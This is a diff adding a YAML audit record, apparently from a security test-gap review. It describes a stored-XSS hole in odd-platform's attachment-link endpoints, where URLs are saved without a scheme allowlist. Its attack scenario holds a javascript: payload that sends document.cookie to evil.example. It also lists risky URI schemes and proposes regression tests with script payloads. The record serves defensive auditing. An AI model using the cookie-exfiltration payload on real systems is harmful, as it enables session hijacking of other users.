@@ -1,0 +1,74 @@
+gap_id: TEST-GAP-738
+category: missing-security
+criticality: HIGH
+node_ids:
+  - "odd-platform java DataEntityAttachmentController controller-class:DataEntityAttachmentController"
+pillars_affected: [P-01, P-09]
+surfaced_by:
+  - "DataEntityAttachmentController.md:bugs_limitations_corner_cases.[7] (Link URLs in saveLinks / updateLink are stored raw with no validation — no @URL constraint, no scheme allowlist, no length cap. A link with javascript: scheme is stored and rendered by the UI — severity MEDIUM, F-004 family on the dedicated link surface)"
+  - "DataEntityAttachmentController.md:security.known_security_gaps.[4] (link URL field has no scheme allowlist, no @URL constraint, no length cap — javascript: and data: URIs are storable and rendered by the UI — severity MEDIUM cross-reference F-004 stored-XSS family)"
+behaviour: |-
+  **HIGH — `saveLinks` / `updateLink` accept link URLs verbatim with NO scheme allowlist, NO `@URL` constraint, NO length cap. A link with `javascript:` scheme is STORED and RENDERED by the UI — F-004 family stored-XSS on the dedicated DataEntity-link surface (NOT the description surface).** Primary-source confirmed in the batch-V DataEntityAttachmentController sidecar:
+
+  - **Schema tier — no constraint**: `components.yaml:2482-2491` declares `DataEntityLinkFormData` with `url: type: string` — NO `format`, NO `pattern`, NO `maxLength`. OpenAPI 3.0 `format: uri` is NOT applied (would only enforce well-formed URI syntax, but Spring does not validate URI scheme even with that format).
+  - **Service tier — pass-through**: `LinkServiceImpl.java:31-37` (`bulkCreate`) stores `formData.items` directly via the MapStruct mapper — no validation step. `LinkServiceImpl.java:41-46` (`update`) applies `formData` to the existing pojo directly.
+  - **Controller tier — pass-through**: `DataEntityAttachmentController.java:91-114` — saveLinks (POST), updateLink (PUT), deleteLink (DELETE) — all are 1-line `attachmentService.X(...)` delegations with no validation.
+  - **UI tier — render contract**: per the DataEntityAttachmentController sidecar `bugs_limitations_corner_cases.[7]`, "A link with javascript: scheme is stored and rendered by the UI" — the UI's link-render path is the operative defence-in-depth, BUT the UI default behaviour is to render the URL as `<a href={url}>` which executes `javascript:` schemes on click.
+
+  **Attack scenario**:
+  ```
+  POST /api/dataentities/100/links
+  {
+    "items": [
+      {
+        "url": "javascript:fetch('https://evil.example/exfil?cookie='+document.cookie)",
+        "description": "Important runbook"
+      }
+    ]
+  }
+  ```
+  Any subsequent authenticated user viewing the data entity's attachments tab who CLICKS the "Important runbook" link executes the `javascript:` URL in the platform's origin. The blast radius is the entire authenticated-user pool (read-collaborative posture means every authenticated user can READ every data entity's attachments per TEST-GAP-028 / TEST-GAP-740).
+
+  **Related URI schemes**:
+  - `javascript:` — direct script execution
+  - `data:text/html,<script>...` — script execution via data-URI
+  - `vbscript:` — IE-only but still rendered in some embedded webviews
+  - `file://` — local file access (some browsers honour, exposing local file content)
+  - `intent://` — Android-specific intent invocation
+
+  **Compound with TEST-GAP-022 + TEST-GAP-027 + TEST-GAP-028 + TEST-GAP-731 + TEST-GAP-735 + TEST-GAP-740**: the link URL is now THE SEVENTH distinct attachment-subsystem security gap. The cumulative finding: the entire attachment subsystem has compound security weakness across (a) upload state-machine hijack, (b) header injection, (c) read-without-permission, (d) cross-entity URL spoofing, (e) filename path-traversal, (f) link-URL-scheme bypass — six independent surfaces in one controller. The aggregate severity at the SUBSYSTEM level is CRITICAL; the individual surface is HIGH.
+
+  **Why HIGH not CRITICAL**: each individual attack requires a user-click action (the link must be clicked to fire the `javascript:` payload). The compound with the read-collaborative cross-entity exposure means the SAME payload reaches every authenticated user's attachment-tab on the target entity, but click-to-execute remains required. HIGH for the per-instance severity.
+
+  **Test gap shape**: regression-pin asserting the verbatim-storage contract for link URLs with `javascript:`, `data:`, and `vbscript:` schemes. Pin the current behaviour so a future maintainer adding a scheme allowlist breaks the test in lockstep.
+test_files_existing: []
+test_files_proposed:
+  path: "odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/api/AttachmentLinkUrlSchemeAllowlistTest.java"
+  name: "saveLinks_withJavascriptDataAndVbscriptSchemes_persistsAndRendersUnchanged_pinsCurrentMissingAllowlist"
+evidence:
+  - "DataEntityAttachmentController.md says (bugs_limitations_corner_cases.[7]): 'Link URLs in saveLinks / updateLink (DataEntityLinkFormData.url) are stored raw with no validation — no @URL constraint, no scheme allowlist, no length cap. A link with javascript: scheme is stored and rendered by the UI; this is the same class as F-004 (stored-XSS family) but on the dedicated link surface rather than the description field.' — severity MEDIUM (cross-reference F-004)"
+  - "DataEntityAttachmentController.md says (security.known_security_gaps.[4]): 'link URL field has no scheme allowlist, no @URL constraint, no length cap — javascript: and data: URIs are storable and rendered by the UI — evidence: components.yaml:2482-2491 + LinkServiceImpl.java:31-46 — severity MEDIUM (cross-reference F-004 stored-XSS family)'"
+  - "Verified at primary source: components.yaml:2482-2491 (DataEntityLinkFormData schema has no format or pattern) + LinkServiceImpl.java:31-37 (bulk-create stores formData directly via mapper) + LinkServiceImpl.java:41-46 (update applies formData to pojo directly) + DataEntityAttachmentController.java:91-114 (controller passes-through)"
+cross_references:
+  - "F-004 (stored-XSS family — this gap adds the link-surface variant)"
+  - "TEST-GAP-732 (NEW batch V — QueryExample F-004 4th surface — sister Markdown render path)"
+  - "TEST-GAP-720 (TermServiceImpl side-channel XSS staging — sister F-004 family)"
+  - "TEST-GAP-022 (uploadId hijack), TEST-GAP-027 (CRLF injection), TEST-GAP-028 (read no SecurityRule), TEST-GAP-731 (cross-entity spoofing), TEST-GAP-735 (filename path-traversal), TEST-GAP-740 (read endpoints) — sister attachment-surface gaps; this gap is the SEVENTH distinct surface vulnerability"
+  - "concepts: attachment-subsystem-compound-security-aggregate (NEW concept candidate — seven distinct vulnerabilities on one controller)"
+  - "REFACTOR-NNN candidate: at LinkServiceImpl / DataEntityAttachmentController, apply a URI scheme allowlist (http, https, ftp, sftp, mailto — operator-curated allowlist via config); reject anything else with BadUserRequestException"
+  - "DOC-NNN candidate: surface the link-scheme-allowlist absence on the attachments doc page"
+related_features: [F-008, F-004]
+related_pillar_features: ["P-01:F-007", "P-09:F-001"]
+proposed_action: |-
+  Add `AttachmentLinkUrlSchemeAllowlistTest` at `odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/api/`. Five test methods:
+  1. `saveLinks_withJavascriptScheme_persistsVerbatim_pinsCurrentMissingAllowlist` — POST `/api/dataentities/100/links` with `{ items: [{ url: "javascript:alert(1)", description: "..." }] }`; assert HTTP 200; GET `/api/dataentities/100/attachments`; assert the link URL is byte-equal to `javascript:alert(1)`.
+  2. `saveLinks_withDataUriScheme_persistsVerbatim` — sister test for `data:text/html,<script>...` scheme.
+  3. `saveLinks_withVbscriptScheme_persistsVerbatim` — sister test.
+  4. `saveLinks_withFileScheme_persistsVerbatim` — sister test for `file://` scheme.
+  5. `saveLinks_withMaxLengthBoundary_acceptsArbitrarilyLongUrl` — pin the absence of length cap: POST with a 1MB URL string; assert HTTP 200; PIN the no-length-cap contract.
+
+  Add a `// REGRESSION-PIN — Link URL has no scheme allowlist, no length cap. The UI render-tier is the operative defence (or absence thereof). A REFACTOR adding a scheme allowlist (e.g. only allow http/https/ftp/sftp/mailto) will break tests #1-#4. The maintainer must re-author them to assert the BadUserRequestException + the scheme-rejected error message.` comment block.
+
+  Pair with REFACTOR-NNN: implement scheme allowlist + length cap at LinkServiceImpl OR at the OpenAPI schema layer (preferred — declarative); pair with DOC-NNN disclosing the current absent contract and the future allowlist.
+batch: 2026-05-20-V
+feature_id: F-008
